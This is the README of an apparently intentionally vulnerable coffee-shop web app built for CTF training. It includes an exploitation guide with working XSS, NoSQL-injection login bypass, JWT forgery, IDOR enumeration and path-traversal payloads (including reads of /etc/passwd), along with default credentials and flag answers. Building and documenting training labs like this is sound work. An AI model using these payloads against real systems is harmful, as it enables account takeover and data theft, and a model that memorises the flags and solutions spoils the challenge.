# BrewMaster Coffee Shop - Vulnerable Web Application

A purposefully vulnerable Node.js/Express coffee shop application designed for security testing and CTF challenges. This application contains multiple security vulnerabilities mapped to OWASP Top 10.

## 🚨 **WARNING**
This application is intentionally vulnerable and should NEVER be deployed in a production environment. It is designed solely for educational and security testing purposes.

## 🛠️ Setup Instructions

### Prerequisites
- Node.js (v14 or higher)
- MongoDB (local or MongoDB Atlas)
- Git

### Installation

1. **Clone the repository**
```bash
git clone <repository-url>
cd brewmaster-coffee-shop
```

2. **Install dependencies**
```bash
npm install
```

3. **Configure MongoDB**
   - For local MongoDB: Update connection string in `app.js`
   - For MongoDB Atlas: Replace the connection string with your Atlas URI
   ```javascript
   mongoose.connect('mongodb://localhost:27017/coffeeshop', {
   // OR
   mongoose.connect('mongodb+srv://username:password@cluster.mongodb.net/coffeeshop', {
   ```

4. **Seed the database**
```bash
npm run seed
```

5. **Start the application**
```bash
npm start
# OR for development
npm run dev
```

6. **Access the application**
   - Open http://localhost:3000 in your browser

## 🎯 Vulnerabilities Overview

This application contains **5 major vulnerabilities** for security testing:

### 1. **Cross-Site Scripting (XSS)** - OWASP A07:2021
- **Location**: Coffee details page comment parameter
- **Payload**: `/coffee/<coffee-id>?comment=<script>alert('XSS')</script>`
- **Advanced Flag**: Requires secret key from NoSQL injection targeting "Dio"
- **Secret Payload**: Must include `DioBrandoSecretKey2025` in XSS payload
- **Flag**: JWT Secret `coffee123` (enables JWT privilege escalation)

### 2. **NoSQL Injection** - OWASP A03:2021
- **Location**: Login form and coffee search
- **Payload**: `{"$ne": null}` for username/password fields
- **Special Target**: `{"username": "Dio", "password": {"$ne": null}}` provides XSS key
- **Alternative**: Search parameter injection
- **Flag**: Bypass login to access user accounts

### 3. **JWT Privilege Escalation** - OWASP A07:2021
- **Location**: JWT token manipulation with known secret
- **Exploit**: Use JWT secret from XSS to forge admin tokens
- **Requirement**: JWT secret obtained from successful XSS attack
- **Flag**: Access admin dashboard with forged admin JWT

### 4. **Insecure Direct Object References (IDOR)** - OWASP A01:2021
- **Location**: `/order/view/:userId` endpoint
- **Exploit**: Change userId parameter to access other users' orders
- **Flag**: View orders of different users

### 5. **Path Traversal** - OWASP A01:2021
- **Location**: `/files/:filename` endpoint
- **Payload**: `/files/../../../etc/passwd` or `/files/../app.js`
- **Flag**: `flag{path_traversal_success}` (hidden in server files)

### 6. **Clickjacking** - OWASP A05:2021
- **Location**: Admin pages (no X-Frame-Options header)
- **Exploit**: Embed admin pages in malicious iframe
- **Flag**: `flag{clickjacking_secret_accessed}`

## 🔑 Default Credentials

```
Admin Account:
- Username: admin
- Password: admin123

Test User Account:
- Username: testuser  
- Password: password123

Regular User:
- Username: john
- Password: secret
```

## 📁 Application Structure

```
├── app.js                 # Main application file
├── models/                # MongoDB models
│   ├── User.js
│   ├── Coffee.js
│   └── Order.js
├── routes/                # Route handlers
│   ├── auth.js           # Authentication routes
│   ├── coffee.js         # Coffee menu routes
│   ├── order.js          # Order management
│   └── admin.js          # Admin panel routes
├── views/                 # EJS templates
│   ├── index.ejs         # Homepage
│   ├── login.ejs         # Login page
│   ├── coffee/           # Coffee-related views
│   └── admin/            # Admin panel views
├── scripts/
│   └── seed.js           # Database seeding script
├── uploads/              # File upload directory (for path traversal)
└── public/               # Static files
```

## 🎮 CTF Challenges & Flags

### Challenge 1: Basic XSS
- **Objective**: Find and exploit XSS vulnerability
- **Hint**: Check the coffee details page comments
- **Flag Location**: XSS payload execution

### Challenge 2: NoSQL Injection Login Bypass
- **Objective**: Bypass login using NoSQL injection
- **Hint**: MongoDB queries can be manipulated
- **Flag Location**: Access to user accounts

### Challenge 3: JWT Algorithm Confusion
- **Objective**: Bypass JWT authentication
- **Hint**: JWT "none" algorithm vulnerability
- **Flag Location**: Admin dashboard access

### Challenge 4: IDOR Attack
- **Objective**: Access other users' order data
- **Hint**: Check URL parameters in order viewing
- **Flag Location**: Other users' private information

### Challenge 5: Path Traversal
- **Objective**: Read server files using directory traversal
- **Hint**: File serving endpoint lacks proper validation
- **Flag Location**: Hidden in server files

### Challenge 6: Clickjacking Attack
- **Objective**: Demonstrate clickjacking vulnerability
- **Hint**: Admin pages lack frame protection headers
- **Flag Location**: Secret admin panel

## 🔧 Exploitation Guide

### XSS Exploitation
**Basic XSS (No Flag):**
1. Navigate to any coffee details page
2. Add `?comment=<script>alert('XSS')</script>` to URL
3. Observe XSS execution but no flag

**Advanced XSS (With Flag):**
1. First, get the secret key via targeted NoSQL injection (see below)
2. Include the key in your XSS payload: 
   ```
   ?comment=<script>alert('DioBrandoSecretKey2025')</script>
   ```
3. Observe XSS execution WITH flag

### NoSQL Injection
**Method 1: Browser Developer Tools**
1. Go to login page and open Developer Tools (F12)
2. Go to Network tab
3. Enter any username/password and click login
4. Right-click the login request → "Edit and Resend"
5. Modify the request body to: `{"username": {"$ne": null}, "password": {"$ne": null}}`
6. Send the modified request

**Method 2: Browser Console**
```javascript
// Standard NoSQL injection (no key provided)
fetch('/auth/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "username": {"$ne": null}, 
        "password": {"$ne": null}
    })
}).then(response => response.json()).then(data => {
    console.log('Standard NoSQL injection result:', data);
});

// Targeted NoSQL injection to get XSS key
fetch('/auth/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "username": "Dio", 
        "password": {"$ne": null}
    })
}).then(response => response.json()).then(data => {
    console.log('Targeted NoSQL injection result:', data);
    if (data.xssKey) {
        console.log('🔑 XSS Key obtained:', data.xssKey);
        console.log('💡 Use this key in XSS payload to get flag!');
        console.log('📋 Example: ?comment=<script>alert("' + data.xssKey + '")</script>');
    }
});
```

**Method 3: cURL Command**
```bash
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

3. Bypass authentication

### JWT Privilege Escalation
**Prerequisites:** You need the JWT secret from the XSS attack (coffee123)

**Step 1: Login as Regular User**
```javascript
// Login as any regular user to get a valid JWT
fetch('/auth/login-api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        "username": "testuser", 
        "password": "password123"
    })
}).then(response => response.json()).then(data => {
    console.log('User JWT:', data.token);
    localStorage.setItem('jwt_token', data.token);
});
```

**Step 2: Decode Your Current JWT**
```javascript
// Decode your current JWT to see the structure
const currentToken = localStorage.getItem('jwt_token');
const payload = JSON.parse(atob(currentToken.split('.')[1]));
console.log('Current payload:', payload);
// Should show: { userId: "...", username: "testuser", role: "user", iat: ..., exp: ... }
```

**Step 3: Create Admin JWT with Known Secret**
```javascript
// Create a new admin JWT using the secret from XSS
const jwtSecret = 'coffee123'; // Obtained from XSS attack

// Create admin payload
const adminPayload = {
    userId: payload.userId, // Keep your user ID
    username: payload.username, // Keep your username
    role: 'admin', // Escalate to admin!
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60) // 24 hours
};

// You'll need to use a JWT library or online tool to sign this
console.log('Admin payload to sign:', adminPayload);
console.log('Secret to use:', jwtSecret);
```

**Step 4: Use Online JWT Tool**
1. Go to https://jwt.io/
2. In the "Decoded" section, paste your admin payload:
   ```json
   {
     "userId": "your-user-id-here",
     "username": "testuser", 
     "role": "admin",
     "iat": 1759214408,
     "exp": 1759300808
   }
   ```
3. In the "Verify Signature" section, enter secret: `coffee123`
4. Copy the generated JWT from the "Encoded" section

**Step 5: Test Admin Access**
```javascript
// Set your forged admin JWT
const forgedAdminJWT = 'your-forged-jwt-here';
localStorage.setItem('jwt_token', forgedAdminJWT);

// Test admin access
fetch('/admin/dashboard', {
    headers: {
        'Authorization': `Bearer ${forgedAdminJWT}`
    }
})
.then(response => {
    if (response.ok) {
        console.log('🎉 SUCCESS: Admin access granted!');
        console.log('🚩 FLAG: JWT privilege escalation successful!');
        window.location.href = '/admin/dashboard';
    } else {
        console.log('❌ Access denied:', response.status);
    }
});
```

### IDOR Attack
**Method 1: Browser Address Bar**
1. Login as regular user (testuser/password123)
2. Go to your orders page and note your user ID in the URL
3. Try accessing other users' orders by changing the user ID:
   - `/order/view/admin` - Try admin's orders
   - `/order/view/john` - Try john's orders  
   - `/order/view/testuser` - Your own orders (should work)

**Method 2: MongoDB ObjectID Enumeration**
```javascript
// Run in browser console after logging in
// Generate common MongoDB ObjectID patterns to try
const generateObjectIds = () => {
    const baseIds = [
        '507f1f77bcf86cd799439011',
        '507f191e810c19729de860ea', 
        '507f1f77bcf86cd799439012',
        '507f1f77bcf86cd799439013',
        '507f1f77bcf86cd799439014',
        '507f1f77bcf86cd799439015'
    ];
    
    return baseIds;
};

// Test IDOR vulnerability
const testIDOR = async () => {
    console.log('🎯 Testing IDOR vulnerability...');
    
    const userIds = [
        'admin', 'testuser', 'john', 'user1', 'user2',
        ...generateObjectIds()
    ];
    
    for (const userId of userIds) {
        try {
            const response = await fetch(`/order/view/${userId}`);
            
            if (response.ok) {
                const data = await response.text();
                console.log(`✅ SUCCESS - /order/view/${userId}:`);
                
                // Check for sensitive data
                if (data.includes('order') || data.includes('Order')) {
                    console.log(`📋 Found orders for user: ${userId}`);
                    
                    // Look for flags or sensitive info
                    if (data.includes('flag{') || data.includes('FLAG{')) {
                        const flagMatch = data.match(/flag\{[^}]+\}/i);
                        if (flagMatch) console.log('🚩 FLAG FOUND:', flagMatch[0]);
                    }
                }
            } else if (response.status !== 404) {
                console.log(`⚠️  ${userId}: ${response.status} ${response.statusText}`);
            }
            
        } catch (error) {
            // Silent fail for network errors
        }
        
        // Small delay to avoid overwhelming server
        await new Promise(resolve => setTimeout(resolve, 100));
    }
};

// Execute IDOR test
testIDOR();
```

**Method 3: Systematic User Enumeration**
```javascript
// Test common usernames and patterns
const commonUsers = [
    'admin', 'administrator', 'root', 'test', 'testuser',
    'user', 'user1', 'user2', 'user3', 'guest', 'demo',
    'john', 'jane', 'bob', 'alice', 'charlie', 'david',
    'manager', 'supervisor', 'employee'
];

commonUsers.forEach(async (username, index) => {
    setTimeout(() => {
        fetch(`/order/view/${username}`)
            .then(response => {
                if (response.ok) {
                    console.log(`✅ IDOR Success: Found orders for '${username}'`);
                    return response.text();
                } else {
                    console.log(`❌ No access: ${username} (${response.status})`);
                }
            })
            .then(data => {
                if (data && data.includes('order')) {
                    console.log(`📋 ${username} has order data available`);
                }
            })
            .catch(() => {}); // Silent fail
    }, index * 200); // Stagger requests
});
```

**Direct URLs to Test:**
- `http://localhost:3000/order/view/admin`
- `http://localhost:3000/order/view/testuser`  
- `http://localhost:3000/order/view/john`
- `http://localhost:3000/order/view/user1`

### Path Traversal
**Method 1: Browser Address Bar**
1. Navigate directly to: `http://localhost:3000/files/../app.js`
2. Try: `http://localhost:3000/files/../package.json`
3. Try: `http://localhost:3000/files/../uploads/secret-flag.txt`
4. Try: `http://localhost:3000/files/../../app.js` (go up more directories)

**Method 2: Browser Console**
```javascript
// Test multiple path traversal payloads - FIXED VERSION
const payloads = [
    '../app.js',
    '../package.json', 
    '../uploads/secret-flag.txt',
    '../secret-flag.txt',
    '../../app.js',
    '../../../etc/passwd',
    '../routes/auth.js',
    '../models/User.js'
];

console.log('🎯 Testing Path Traversal payloads...');

payloads.forEach(payload => {
    // IMPORTANT: Must use /files/ endpoint for path traversal
    fetch(`/files/${payload}`)
        .then(response => {
            if (response.ok) {
                return response.text();
            } else {
                throw new Error(`${response.status}: ${response.statusText}`);
            }
        })
        .then(data => {
            console.log(`✅ SUCCESS - /files/${payload}:`);
            console.log(data.substring(0, 200) + '...');
            
            // Check for flags in the response
            if (data.includes('flag{') || data.includes('FLAG{')) {
                console.log('🚩 FLAG FOUND in', payload);
                const flagMatch = data.match(/flag\{[^}]+\}/i);
                if (flagMatch) console.log('🎯 FLAG:', flagMatch[0]);
            }
        })
        .catch(error => {
            console.log(`❌ FAILED - /files/${payload}: ${error.message}`);
        });
});
```

**Method 3: cURL Commands**
```bash
# Test common files
curl http://localhost:3000/files/../app.js
curl http://localhost:3000/files/../package.json
curl http://localhost:3000/files/../uploads/secret-flag.txt

# Try Windows paths (if on Windows)
curl http://localhost:3000/files/../../../Windows/System32/drivers/etc/hosts

# Try Linux paths (if on Linux)
curl http://localhost:3000/files/../../../etc/passwd
```

**Target Files to Look For:**
- `../app.js` - Main application file
- `../package.json` - Dependencies and scripts  
- `../uploads/secret-flag.txt` - Hidden flag file
- `../routes/auth.js` - Authentication code
- `../models/User.js` - User model with credentials
- `../../etc/passwd` - System password file (Linux)
- `../../Windows/System32/drivers/etc/hosts` - System hosts file (Windows)

## 🛡️ Security Headers Missing

The application intentionally lacks several security headers:
- `X-Frame-Options` (enables clickjacking)
- `Content-Security-Policy` (enables XSS)
- `X-XSS-Protection` (browser XSS protection disabled)
- `Strict-Transport-Security` (no HTTPS enforcement)

## 📝 Educational Notes

This application demonstrates:
- Input validation failures
- Authentication bypass techniques
- Authorization flaws
- Injection vulnerabilities
- Client-side security issues
- Server-side security misconfigurations

## 🤝 Contributing

To add more vulnerabilities or improve existing ones:
1. Fork the repository
2. Create a feature branch
3. Add your vulnerability with proper documentation
4. Submit a pull request

## ⚖️ Legal Disclaimer

This software is provided for educational and testing purposes only. Users are responsible for ensuring they have proper authorization before testing on any systems. The authors are not responsible for any misuse of this software.

## 📚 Learning Resources

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [TryHackMe Web Application Security](https://tryhackme.com/paths)

## 📞 Support

For questions or issues related to this CTF application, please create an issue in the repository or contact the maintainers.

---

**Remember**: This is a vulnerable application by design. Never use this code in production!